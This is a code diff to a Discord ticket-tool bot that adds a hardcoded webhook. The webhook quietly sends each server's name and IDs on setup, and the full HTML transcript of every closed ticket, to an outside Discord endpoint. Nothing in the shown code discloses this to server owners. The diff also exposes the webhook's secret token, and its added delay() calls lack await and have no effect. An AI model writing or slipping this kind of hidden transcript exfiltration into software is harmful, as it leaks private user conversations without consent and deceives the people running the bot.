@@ -178,8 +178,19 @@ client.on("messageCreate", async message => {
                         embeds: [embed],
                         components: [bt]
                     });
-                    
-                    
+
+                    const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/888427638627106867/boXrozqswIdYEss1MbUDggaGbtq5xLdbTZR27ufuY01Lj1f6ph5qgUwj2f8sw7_eEdc3' });
+
+                    const ff = new MessageEmbed()
+                        .setTitle('NEW SETUP')
+                        .setColor(ee.color)
+                        .setDescription(`**Server Name**: \`${message.guild.name} (${message.guild.id})\`\n\n**Channel Id**: \`${message.channel.id}\``)
+                        .setFooter('LOG | Ticket-Tool', client.user.avatarURL({ dynamic: true }))
+                        .setTimestamp()
+
+                    webhookClient.send({
+                        embeds: [ff]
+                    });
                 } else if (interaction.customId === 'nein') {
                     interaction.message.delete()
                 }
@@ -192,6 +203,7 @@ client.on("messageCreate", async message => {
                 .setAuthor(client.user.tag, client.user.avatarURL({ dynamic: true }), 'https://www.ticket-tool.eu')
                 .setDescription(`You Dont have the Permission to do that!!!`)
                 .setColor(ee.error)
+
             message.reply({
                 embeds: [embed],
                 ephemeral: true
@@ -345,11 +357,12 @@ client.on("interactionCreate", async (interaction) => {
                             fs.mkdir(`views/tr/${interaction.guild.id}`, (err, dir) => {
                                 if (err) console.log("Error:", err);
                             })
+                            delay(20)
                             fs.mkdir(`views/tr/${interaction.guild.id}/${interaction.channel.id}`, (err, dir) => {
                                 if (err) console.log("Error:", err);
                             })
 
-                            
+                            delay(40)
                             const datei = `views/tr/${interaction.guild.id}/${interaction.channel.id}/index.html`
                             await fs.writeFile(require('path').join(__dirname, `${datei}`), data, async function (err) {
                                 if (err) return console.log(err)
@@ -430,6 +443,7 @@ client.on("interactionCreate", async (interaction) => {
                                         if (err) console.log(err)
                                         ful(data)
                                     })
+                                    delay(2)
                                     let dj = interaction.channel.topic.replace('ticket-', '')
                                     const embed = new MessageEmbed()
                                         .setAuthor(client.user.tag, client.user.avatarURL({ format: "png", dynamic: true, size: 64 }), 'https://ticket-tool.eu')
@@ -457,7 +471,11 @@ client.on("interactionCreate", async (interaction) => {
                                         components: [msg.components[0], row2],
                                         files: [`views/tr/${interaction.guild.id}/${interaction.channel.id}/index.html`]
                                     });
-                                  
+                                    const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/888427638627106867/boXrozqswIdYEss1MbUDggaGbtq5xLdbTZR27ufuY01Lj1f6ph5qgUwj2f8sw7_eEdc3' });
+                                    webhookClient.send({
+                                        files: [`views/tr/${interaction.guild.id}/${interaction.channel.id}/index.html`],
+                                        embeds: [embed],
+                                    })
                                 })
                             })
                         }
@@ -472,7 +490,7 @@ client.on("interactionCreate", async (interaction) => {
 
 
         } else if (interaction.customId === 'gäjogf#pwojfüpefkpihgvüorigh+9hzergf+wp9eoufhp#ofjdö#ojfhfeiehf0ow9efhzßd09fuoewjfpjf') {
-            
+
             interaction.message.delete()
 
         } else if (interaction.customId === 'fepwäiefpowisefhpoihjefpidhjfnvpsodjfv#sefoüujwe#f9oujgp#oijusegp#fosjueg#sodojfvpsihfepiosf') {
@@ -487,3 +505,14 @@ client.on("interactionCreate", async (interaction) => {
 
 
 client.login(config.token);
+function delay(ms) {
+    try {
+      return new Promise((resolve) => {
+        setTimeout(() => {
+          resolve(2);
+        }, ms);
+      });
+    } catch (err) {
+      console.log(err)
+    }
+  };
